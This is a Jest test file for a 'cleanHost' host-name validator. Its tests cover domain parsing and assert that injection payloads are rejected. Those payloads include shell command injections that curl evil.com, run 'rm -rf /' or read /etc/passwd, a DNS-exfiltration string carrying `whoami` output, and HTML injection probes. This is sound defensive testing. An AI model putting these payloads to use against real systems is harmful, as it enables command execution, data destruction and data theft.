import { cleanHost } from "./util";

describe("cleanHost", () => {
    it("handles comma-separated domains by taking the first one", () => {
        expect(cleanHost("example.com,another.com")).toBe("example.com");
        expect(cleanHost("first.domain.com, second.domain.com")).toBe("first.domain.com");
        expect(cleanHost("api.test.com,www.test.com,test.com")).toBe("api.test.com");
    });

    it("returns undefined for null and undefined", () => {
        expect(cleanHost(null)).toBeUndefined();
        expect(cleanHost(undefined)).toBeUndefined();
    });

    it("returns undefined for empty string", () => {
        expect(cleanHost("")).toBeUndefined();
        expect(cleanHost("   ")).toBeUndefined();
    });

    it("returns undefined for localhost", () => {
        expect(cleanHost("localhost")).toBeUndefined();
        expect(cleanHost("localhost:3000")).toBeUndefined();
    });

    it("returns undefined for IP addresses", () => {
        expect(cleanHost("192.168.1.1")).toBeUndefined();
        expect(cleanHost("10.0.0.1")).toBeUndefined();
    });

    it("strips protocol from hosts", () => {
        expect(cleanHost("https://example.com")).toBe("example.com");
        expect(cleanHost("http://example.com")).toBe("example.com");
    });

    it("strips trailing slash from hosts", () => {
        expect(cleanHost("example.com/")).toBe("example.com");
    });

    it("accepts valid domain names", () => {
        expect(cleanHost("example.com")).toBe("example.com");
        expect(cleanHost("docs.example.com")).toBe("docs.example.com");
        expect(cleanHost("my-docs.example.com")).toBe("my-docs.example.com");
        expect(cleanHost("example.co.uk")).toBe("example.co.uk");
        expect(cleanHost("docs.buildwithfern.com")).toBe("docs.buildwithfern.com");
    });

    it("accepts domains with ports", () => {
        expect(cleanHost("example.com:3000")).toBe("example.com:3000");
        expect(cleanHost("docs.example.com:8080")).toBe("docs.example.com:8080");
    });

    it("accepts percent-encoded basepath domains", () => {
        expect(cleanHost("example.com%2Frepo1")).toBe("example.com%2Frepo1");
        expect(cleanHost("example.com%2Fnemo%2Fnemo-rl")).toBe("example.com%2Fnemo%2Fnemo-rl");
    });

    it("accepts domains with underscores", () => {
        expect(cleanHost("my_docs.example.com")).toBe("my_docs.example.com");
    });

    it("accepts internationalized domain names (unicode)", () => {
        expect(cleanHost("例え.jp")).toBe("例え.jp");
        expect(cleanHost("münchen.de")).toBe("münchen.de");
        expect(cleanHost("中文.com")).toBe("中文.com");
        expect(cleanHost("xn--nxasmq6b.com")).toBe("xn--nxasmq6b.com");
    });

    it("rejects domains with @ sign", () => {
        expect(cleanHost("user@example.com")).toBeUndefined();
    });

    it("rejects hosts exceeding max domain length (253 chars)", () => {
        const longHost = "a".repeat(254) + ".com";
        expect(cleanHost(longHost)).toBeUndefined();
    });

    it("accepts hosts at exactly max domain length", () => {
        const maxHost = "a".repeat(249) + ".com";
        expect(cleanHost(maxHost)).toBe(maxHost);
    });

    describe("rejects injection payloads", () => {
        it("rejects shell command injection via x-fern-host", () => {
            expect(cleanHost("'\" & curl 1-0edd39c6d42eacfa-111-slug-1771524972")).toBeUndefined();
            expect(cleanHost("'; curl evil.com")).toBeUndefined();
            expect(cleanHost("$(whoami).evil.com")).toBeUndefined();
            expect(cleanHost("`whoami`.evil.com")).toBeUndefined();
        });

        it("rejects strings with spaces", () => {
            expect(cleanHost("example .com")).toBeUndefined();
            expect(cleanHost("not a domain")).toBeUndefined();
        });

        it("rejects strings with shell metacharacters", () => {
            expect(cleanHost("example.com; rm -rf /")).toBeUndefined();
            expect(cleanHost("example.com | cat /etc/passwd")).toBeUndefined();
            expect(cleanHost("example.com && echo pwned")).toBeUndefined();
            expect(cleanHost("$(curl evil.com)")).toBeUndefined();
            expect(cleanHost("example.com > /tmp/out")).toBeUndefined();
            expect(cleanHost("example.com < /etc/passwd")).toBeUndefined();
        });

        it("rejects strings with quotes", () => {
            expect(cleanHost("'example.com'")).toBeUndefined();
            expect(cleanHost('"example.com"')).toBeUndefined();
        });

        it("rejects strings with curly braces or brackets", () => {
            expect(cleanHost("example.com/{path}")).toBeUndefined();
            expect(cleanHost("example.com/[id]")).toBeUndefined();
        });

        it("rejects strings with other dangerous characters", () => {
            expect(cleanHost("example.com#fragment")).toBeUndefined();
            expect(cleanHost("example.com?query=1")).toBeUndefined();
            expect(cleanHost("example.com!")).toBeUndefined();
            expect(cleanHost("example.com~test")).toBeUndefined();
            expect(cleanHost("example.com\\path")).toBeUndefined();
            expect(cleanHost("example.com^test")).toBeUndefined();
            expect(cleanHost("example.com*")).toBeUndefined();
        });

        it("rejects DNS exfiltration payloads", () => {
            expect(
                cleanHost(
                    "' & curl 1-0edd39c6d42eacfa-111-slug-1771524972.`whoami`.2.rce.ctwt.d5sv5bdt3.dns.testxazt.x"
                )
            ).toBeUndefined();
        });

        it("rejects XML/HTML injection probes", () => {
            expect(cleanHost("><")).toBeUndefined();
            expect(cleanHost("></arrkqrxpwg")).toBeUndefined();
            expect(cleanHost("></cpuovbtnuk")).toBeUndefined();
            expect(cleanHost("></eihipxktgw")).toBeUndefined();
            expect(cleanHost("></esxtayrbll")).toBeUndefined();
            expect(cleanHost("></lyfaqdnjdu")).toBeUndefined();
            expect(cleanHost("></rdbctlxgey")).toBeUndefined();
            expect(cleanHost("></xvjnoffkzgdata")).toBeUndefined();
        });

        it("rejects @ prefixed DNS exfiltration domains", () => {
            expect(cleanHost("@learning.postman.com.d5sv5bdt3.dns.testxazt.x")).toBeUndefined();
        });

        it("rejects percent-encoded injection payloads", () => {
            // %27=' %22=" %20=space %26=& — attacker bypasses char check via encoding
            expect(cleanHost("example.com%27%22%20%26%20curl%20evil.com")).toBeUndefined();
            expect(cleanHost("example.com%3B%20rm%20-rf")).toBeUndefined();
            expect(cleanHost("example.com%24(whoami)")).toBeUndefined();
        });

        it("allows %2F (percent-encoded slash) for basepath domains", () => {
            expect(cleanHost("example.com%2Frepo")).toBe("example.com%2Frepo");
            expect(cleanHost("example.com%2frepo")).toBe("example.com%2frepo");
        });
    });
});
